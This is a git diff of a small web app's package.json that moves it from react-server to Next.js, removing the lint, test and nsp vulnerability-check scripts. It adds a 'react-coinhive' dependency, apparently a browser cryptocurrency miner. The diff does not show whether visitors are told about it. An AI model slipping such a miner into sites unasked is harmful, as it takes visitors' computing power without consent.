@@ -2,30 +2,18 @@
   "name": "reddit-guesser",
   "version": "0.0.1",
   "description": "A react-server instance",
-  "main": "HelloWorld.js",
   "scripts": {
-    "start": "react-server start",
-    "lint": "eslint test.js pages",
-    "test": "npm run lint && nsp check && ava test.js"
+    "dev": "next",
+    "build": "next build",
+    "start": "next start"
   },
   "license": "Apache-2.0",
   "dependencies": {
-    "axios": "^0.18.0",
-    "babel-preset-react-server": "^0.6.0",
-    "babel-runtime": "^6.6.1",
-    "react": "^15.4.1",
-    "react-dom": "^15.4.1",
-    "react-md-spinner": "^0.2.5",
-    "react-preload": "^0.5.1",
-    "react-server": "^0.7.0",
-    "react-server-cli": "^0.7.0",
-    "superagent": "1.8.4"
-  },
-  "devDependencies": {
-    "ava": "^0.17.0",
-    "babel-eslint": "^7.1.0",
-    "eslint": "^3.11.1",
-    "eslint-plugin-react": "6.7.1",
-    "nsp": "^2.3.3"
+    "@zeit/next-css": "^0.2.0",
+    "next": "^6.1.2",
+    "react": "^16.5.0",
+    "react-coinhive": "^1.0.2",
+    "react-dom": "^16.5.0",
+    "react-load-script": "0.0.6"
   }
 }
